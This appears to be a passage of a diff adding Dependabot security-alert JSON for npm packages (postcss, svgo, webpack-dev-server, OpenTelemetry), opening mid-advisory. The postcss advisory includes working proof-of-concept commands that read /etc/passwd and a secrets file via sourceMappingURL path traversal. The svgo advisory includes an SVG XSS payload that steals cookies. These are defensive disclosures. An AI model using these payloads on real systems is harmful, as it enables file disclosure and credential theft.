attacker.\n\nTrust-boundary analysis:\n* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.\n* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.\n* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.\n\nPrimitives obtained:\n* (a) **Arbitrary file read** — bytes loaded into Node memory.\n* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.\n* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.\n* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.\n\n## PoC\n\nAll commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.\n\n**Vector 1 — Absolute path, default options (no `from`, no `map`):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  try { p().process(\"a{color:red}\\n/*# sourceMappingURL=/etc/passwd */\"); } \\\n  catch(e){console.log(e.message)}'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThe first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.\n\n**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  p().process(\"a{color:red}\\n/*# sourceMappingURL=../../../../../etc/passwd */\", \\\n              {from:\"/var/www/html/styles/main.css\", map:{inline:false}}) \\\n   .catch(e=>console.log(e.message))'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\n`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Vector 3 — File-existence oracle:**\n\n```bash\n# Existing non-JSON file → throws (file confirmed to exist)\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/etc/passwd */\")'\nSyntaxError: Unexpected token 'r', \"root:x:0:0\"... is not valid JSON\n\n# Non-existent file → returns silently (file confirmed absent)\n$ node -e 'r=require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/no/such/file */\"); console.log(\"ok\")'\nok\n```\n\n**Vector 4 — Custom file-content leak:**\n\n```bash\n$ printf 'API_KEY=sk-secret-12345\\n' > /tmp/server-secret.env\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/tmp/server-secret.env */\")' 2>&1 | head -1\nSyntaxError: Unexpected token 'A', \"API_KEY=sk\"... is not valid JSON\n```\n\nThe first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.\n\n**Filesystem-call trace** (proves the read happens with no opts at all):\n\n```js\nconst fs = require('fs');\nconst orig = fs.readFileSync;\nfs.readFileSync = function(p){\n  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);\n  return orig.apply(this, arguments);\n};\nrequire('postcss')().process('a{}\\n/*# sourceMappingURL=/etc/hostname */');\n// → [FILE READ]: /etc/hostname\n// → SyntaxError: Unexpected token 'D', \"Debian-tri\"... is not valid JSON\n```\n\n## Impact\n\n* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.\n* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).\n* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.\n* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.\n* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.\n\n## Recommended Fix\n\nThe root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:\n\n1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):\n\n   ```js\n   // lib/previous-map.js\n   loadMap(file, prev) {\n     if (prev === false) return false\n     if (prev) { /* unchanged */ }\n     else if (this.inline) {\n       return this.decodeInline(this.annotation)\n     } else if (this.annotation) {\n       let annotation = this.annotation\n       // Reject schemes (other than data:, handled above) and absolute paths.\n       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return\n       if (require('path').isAbsolute(annotation)) return\n       if (!file) return  // No base path → cannot safely resolve.\n       const base = require('path').resolve(require('path').dirname(file))\n       const resolved = require('path').resolve(base, annotation)\n       // Refuse anything that escapes the base directory.\n       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {\n         return\n       }\n       return this.loadFile(resolved)\n     }\n   }\n   ```\n\n2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.\n\nA user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-6g55-p6wh-862q",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-45623",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/releases/tag/8.5.12"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-6g55-p6wh-862q"
+        }
+      ],
+      "published_at": "2026-07-23T15:06:16Z",
+      "updated_at": "2026-07-23T15:06:17Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 8.5.11",
+          "first_patched_version": {
+            "identifier": "8.5.12"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00608,
+        "percentile": 0.46527
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        },
+        {
+          "cwe_id": "CWE-200",
+          "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "<= 8.5.11",
+      "first_patched_version": {
+        "identifier": "8.5.12"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/18",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/18",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 17,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "svgo"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-2p49-hgcm-8545",
+      "cve_id": "CVE-2026-73650",
+      "summary": "SVGO removeScripts plugin leaves some executable scripts intact",
+      "description": "### Summary\n\nSVGO's removeScripts plugin (disabled by default) removes scripts from the SVG, however executable scripts were left intact in some cases. If a consumer relied on this plugin for sanitization and served them to users, these SVGs could open up doors to XSS.\n\n### Details\n\nSVGO has a plugin for removing scripts from an SVG, which removes:\n\n- `<script>` elements\n- JavaScript URIs (v4 and v3 only)\n- `on…` event handlers (v4 and v3 only)\n\nWhile SVGO is not a sanitization library, SVGO continues to maintain the plugin for those already using it for this purpose.\n\nHowever, there were two problems:\n\n- SVGO did not check namespaced/prefixed `script` elements, for example if one declared an explicit prefix for the SVG namespace ( `<svg:script>`) instead of using the default namespace ( `<script>`), the `<svg:script>` tag would be left intact.\n- SVGO case sensitively matched JavaScript URIs, but it should've been case-insensitive.\n\n#### Proof of Concept\n\n```js\nimport { optimize } from 'svgo';\n\n/** Presume that this string was obtained in some other way, such as network. */\nconst original = `\n  <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns:uwu=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 100 100\" version=\"1.1\">\n    <a uwu:href=\"JavaScript:(() =&gt; { alert(document.cookie) })();\"><text y=\"30\">uwu</text></a>\n    <svg:script>\n      alert(document.cookie);\n    </svg:script>\n  </svg>\n`;\n\noptimize(original, {\n  plugins: ['removeScripts']\n});\n// Did not remove <svg:script> or uwu:href=\"JavaScript:…—still executed by browsers.\n```\n\n### Impact\n\nIf you run SVGO on untrusted input (e.g., user uploads to a web application) and you depended on removeScripts, then some scripts may still be present. If that SVG was then opened directly by another user on the same domain, it could invoke scripts that could read local storage or cookies.\n\nThis may affect you if you have enabled one of the following:\n\n| SVGO Version | Plugin Name |\n|---|---|\n| v4 | removeScripts |\n| v3 | removeScriptElement |\n| v2 | removeScriptElement |\n| v1 | removeScriptElement |\n\nIt's unlikely to impact users who just use SVGO locally on their own SVGs or in build pipelines.\n\n### Patches\n\n#### >= 3.0.0, <= 4.0.1\n\nSVGO patched v4.0.2 and v3.3.4. Just upgrade the dependency using your preferred package manager! For example:\n\n```sh\nyarn up svgo\n\n# or if SVGO is a nested dependency\nyarn up -R svgo\n```\n\nThe proposed fix is to improve our namespace-aware handling to explicitly act on the default namespace, SVG namespace, and XHTML namespace only. This handles all scripts that are executed by browsers, but will leave intact custom prefixes that happen to have an element called `<*:script>` which clients shouldn't treat as executable. \n\n#### >= 2.0.0, <= 2.8.2\n\nSVGO patched v2.8.3, however SVGO v2 explicitly only implements and documents that it will remove `<script>` elements and nothing more. It has the namespace aware handling for tags like `<svg:script>` or `<xhtml:script>`, but has **_not_** been updated to remove JavaScript URIs or event handlers like >= v3. If this is something you need, please upgrade to v4 or v3, or reach for one of the documented workarounds at the end.\n\n#### >= 1.0.0, <= 1.3.2\n\nSVGO v1 has been deprecated for a while now and won't be patched. Please upgrade to a more recent version! If something is preventing you from doing so, please reach out! We're happy to expand our migration guides or support you if you're having trouble.\n\n### Workarounds\n\nIf your motivation for enabling the plugin is SVG sanitization, consider reaching for a dedicated SVG sanitization tool and invoke it before passing the SVG to SVGO.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-2p49-hgcm-8545",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-73650",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/svg/svgo/security/advisories/GHSA-2p49-hgcm-8545"
+        },
+        {
+          "url": "https://github.com/svg/svgo/commit/628e3bc7336625a30365d0a9b60185307d852466"
+        },
+        {
+          "url": "https://github.com/svg/svgo/commit/72a23886b4698b27624b936f3a15a80afd36d75f"
+        },
+        {
+          "url": "https://github.com/svg/svgo/commit/f529cfccc6c154d6f6eabe276ec637a8c5db6763"
+        },
+        {
+          "url": "https://github.com/svg/svgo/releases/tag/v2.8.3"
+        },
+        {
+          "url": "https://github.com/svg/svgo/releases/tag/v3.3.4"
+        },
+        {
+          "url": "https://github.com/svg/svgo/releases/tag/v4.0.2"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-2p49-hgcm-8545"
+        }
+      ],
+      "published_at": "2026-07-21T19:42:04Z",
+      "updated_at": "2026-08-13T18:08:44Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "svgo"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 1.0.0, < 2.8.3",
+          "first_patched_version": {
+            "identifier": "2.8.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "svgo"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.3.4",
+          "first_patched_version": {
+            "identifier": "3.3.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "svgo"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 4.0.2",
+          "first_patched_version": {
+            "identifier": "4.0.2"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+          "score": 8.2
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00242,
+        "percentile": 0.15545
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+        "score": 8.2
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        },
+        {
+          "cwe_id": "CWE-184",
+          "name": "Incomplete List of Disallowed Inputs"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "svgo"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 1.0.0, < 2.8.3",
+      "first_patched_version": {
+        "identifier": "2.8.3"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/17",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/17",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 16,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-f5vj-f2hx-8m93",
+      "cve_id": "CVE-2026-14620",
+      "summary": "webpack-dev-server vulnerable to cross-site request forgery via internal developer endpoints",
+      "description": "### Impact\n\nThe internal `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints perform state-changing actions on any `GET` request, without verifying that the request originated from the dev server's own page. Any website a developer visits while the dev server is running can trigger them cross-origin with no interaction beyond the visit.\n\nAn attacker can open an arbitrary existing local file in the developer's editor, including files outside the project root (e.g. `~/.ssh/config`). The file's contents are not returned to the attacker. Repeated requests can also spawn editor processes and force recompilations, degrading the developer's machine.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by rejecting cross-site requests to the `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints (see [PR #5698](https://github.com/webpack/webpack-dev-server/pull/5698)).\n\n### Workarounds\n\nNone",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-f5vj-f2hx-8m93",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-14620",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-f5vj-f2hx-8m93"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-14620"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/pull/5698"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/80cd9eea54975fe632a518d8bd902a260f374e7c"
+        },
+        {
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/releases/tag/v5.2.6"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-f5vj-f2hx-8m93"
+        }
+      ],
+      "published_at": "2026-07-20T22:01:56Z",
+      "updated_at": "2026-07-20T22:02:59Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 5.2.5",
+          "first_patched_version": {
+            "identifier": "5.2.6"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:L",
+          "score": 4.7
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00523,
+        "percentile": 0.42012
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:L",
+        "score": 4.7
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-352",
+          "name": "Cross-Site Request Forgery (CSRF)"
+        },
+        {
+          "cwe_id": "CWE-749",
+          "name": "Exposed Dangerous Method or Function"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 5.2.5",
+      "first_patched_version": {
+        "identifier": "5.2.6"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/16",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/16",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 15,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-m28w-2pqf-7qgj",
+      "cve_id": "CVE-2026-14631",
+      "summary": "webpack-dev-server vulnerable to denial of service via a malformed Host or Origin header",
+      "description": "### Impact\n\nAn unauthenticated peer that can reach the `webpack-dev-server` process can terminate it by sending either a normal HTTP request with a malformed `Host` header, or a WebSocket upgrade to the default `/ws` endpoint with a malformed `Origin` header. The malformed header triggers an uncaught exception in the host-validation path and crashes the dev server process.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by treating malformed `Host` and `Origin` header values as invalid rather than throwing (see [PR #5699](https://github.com/webpack/webpack-dev-server/pull/5699)).\n\n### Workarounds\n\nKeep the dev server bound to `localhost` (the default) and do not expose it to untrusted networks.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-m28w-2pqf-7qgj",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-14631",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-m28w-2pqf-7qgj"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-14631"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/pull/5699"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/f21ed0f44aceb6132abb591ee8b60d770b6e489f"
+        },
+        {
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-m28w-2pqf-7qgj"
+        }
+      ],
+      "published_at": "2026-07-20T22:02:31Z",
+      "updated_at": "2026-07-20T22:02:58Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 5.2.5",
+          "first_patched_version": {
+            "identifier": "5.2.6"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00405,
+        "percentile": 0.33539
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-20",
+          "name": "Improper Input Validation"
+        },
+        {
+          "cwe_id": "CWE-248",
+          "name": "Uncaught Exception"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 5.2.5",
+      "first_patched_version": {
+        "identifier": "5.2.6"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/15",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/15",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 14,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-mx8g-39q3-5c79",
+      "cve_id": "CVE-2026-9595",
+      "summary": "webpack-dev-server vulnerable to HMR WebSocket interception via permissive user proxies",
+      "description": "### Impact\n\nWhen a user-configured proxy on `webpack-dev-server` has a broad context (e.g. `/`) and `ws: true`, it also intercepts the dev server's own HMR WebSocket and forwards it to the proxy target. This leaks the browser's cookies and `Origin` header to the backend, bypasses the dev server's Host/Origin validation, and corrupts the HMR socket (both HMR and the proxy end up writing to the same socket).\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.5.\n\n### Workarounds\n\nScope user-defined proxy `context` to specific paths instead of `/`, or omit `ws: true` from the proxy entry when WebSocket forwarding is not required.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-mx8g-39q3-5c79",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-9595",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-mx8g-39q3-5c79"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-9595"
+        },
+        {
+          "url": "https://github.com/facebook/create-react-app/pull/7444"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/pull/4316"
+        },
+        {
+          "url": "https://github.com/vuejs/vue-cli/commit/72ba7505aff2a8314e82aa5082379a77504a1fcb"
+        },
+        {
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-mx8g-39q3-5c79"
+        }
+      ],
+      "published_at": "2026-06-17T18:13:31Z",
+      "updated_at": "2026-06-17T18:13:33Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 5.2.5",
+          "first_patched_version": {
+            "identifier": "5.2.5"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00163,
+        "percentile": 0.05801
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        },
+        {
+          "cwe_id": "CWE-441",
+          "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 5.2.5",
+      "first_patched_version": {
+        "identifier": "5.2.5"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/14",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/14",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 13,
+    "state": "auto_dismissed",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@opentelemetry/core"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-8988-4f7v-96qf",
+      "cve_id": "CVE-2026-54285",
+      "summary": "OpenTelemetry Core: Unbounded memory allocation in W3C Baggage propagation",
+      "description": "## Overview\n\n`W3CBaggagePropagator.extract()` in `@opentelemetry/core` does not enforce size limits when parsing inbound `baggage` HTTP headers. The W3C Baggage specification recommends a maximum of 8,192 bytes and 180 entries; these limits were only enforced on the outbound (`inject()`) path, not on the inbound (`extract()`) path. Parsing oversized baggage causes memory allocation proportional to the header size without any cap.\n\n## Impact\n\nThe practical availability impact for most Node.js deployments is limited. Node.js enforces a default `--max-http-header-size` of 16,384 bytes on the total combined size of all HTTP headers, constraining what an external attacker can deliver before the propagator is reached. Additionally, the header is already in memory (parsed by the HTTP layer) by the time it reaches the propagator - the additional allocation is the overhead of splitting into entry objects, not an unbounded read.\n\nThe risk is higher when transport-layer limits are absent - e.g., non-HTTP transports (messaging systems, custom `TextMapGetter` implementations) or deployments that have raised `--max-http-header-size`.\n\n## Remediation\n\nUpdate `@opentelemetry/core` to version 2.8.0 or later. The fix enforces limits consistent with the W3C Baggage specification at the propagator level:\n\n- Maximum total baggage size: 8,192 bytes\n- Maximum number of entries: 180\n- Maximum per-entry size: 4,096 bytes\n\nHeaders that exceed these limits are truncated at the point the limit is reached.\n\n## Workarounds\n\nEnsure header size limits are configured at the server or gateway level. The default Node.js HTTP header limit (16 KB) mitigates external attack vectors independently of this fix. For non-HTTP transports receiving baggage from untrusted sources, validate input size before passing it to the propagator.\n\n## References\n\n- [W3C Baggage Specification - Limits](https://www.w3.org/TR/baggage/#limits)\n- opentelemetry-java: [GHSA-rcgg-9c38-7xpx](https://github.com/open-telemetry/opentelemetry-java/security/advisories/GHSA-rcgg-9c38-7xpx)\n- opentelemetry-go: [GHSA-mh2q-q3fh-2475](https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475)\n\n## Credit\n\nReported by tonghuaroot.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-8988-4f7v-96qf",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-54285",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/open-telemetry/opentelemetry-js/security/advisories/GHSA-8988-4f7v-96qf"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-8988-4f7v-96qf"
+        }
+      ],
+      "published_at": "2026-06-15T20:38:30Z",
+      "updated_at": "2026-06-15T20:38:31Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
